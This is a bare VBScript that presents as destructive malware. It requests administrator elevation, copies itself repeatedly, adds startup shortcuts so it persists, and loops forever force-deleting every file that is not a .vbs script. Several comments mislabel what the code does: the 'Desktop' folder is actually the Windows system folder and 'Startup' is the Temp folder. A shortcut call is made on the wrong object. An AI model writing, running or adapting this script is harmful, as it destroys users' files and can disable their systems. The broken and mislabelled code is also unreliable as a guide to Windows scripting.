Set objShell = CreateObject("Shell.Application")

' Check if the script is already running with administrator privileges
If Not objShell.AppActivate("Administrator: Command Prompt") Then
    ' If not running with administrator privileges, prompt to run as administrator
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End If

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Shell.Application")
strScriptPath = WScript.ScriptFullName

' Specify the number of copies you want to create
numCopies = 5

Do While True
    For i = 1 To numCopies
        strCopyPath = objFSO.GetParentFolderName(strScriptPath) & "\Copy" & i & ".vbs"
        objFSO.CopyFile strScriptPath, strCopyPath
        
        ' Get the path to the desktop folder
        strDesktopFolder = objFSO.GetSpecialFolder(0) ' 0 represents the Desktop folder
        
        ' Create a copy of the script on the desktop
        strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
        objFSO.CopyFile strCopyPath, strDesktopCopyPath
        
        ' Get the path to the startup folder
        strStartupFolder = objFSO.GetSpecialFolder(2) ' 2 represents the Startup folder
        
        ' Create a shortcut to the copied script in the startup folder
        Set objShortcut = objShell.CreateShortcut(strStartupFolder & "\Copy" & i & ".lnk")
        objShortcut.TargetPath = strDesktopCopyPath
        objShortcut.Save
    Next

    ' Loop through the desktop folder and delete non-vbs files
    For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
        If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
            objFSO.DeleteFile objFile.Path, True
        End If
    Next

    ' Loop through the File Explorer and delete non-vbs files
    Set objExplorerFolder = objShell.NameSpace(0)
    For Each objFile In objExplorerFolder.Items
        If objFSO.GetExtensionName(objFile.Path) <> "vbs" Then
            objFSO.DeleteFile objFile.Path, True
        End If
    Next

    ' Wait for a certain amount of time before looping again
    WScript.Sleep 0
Loop
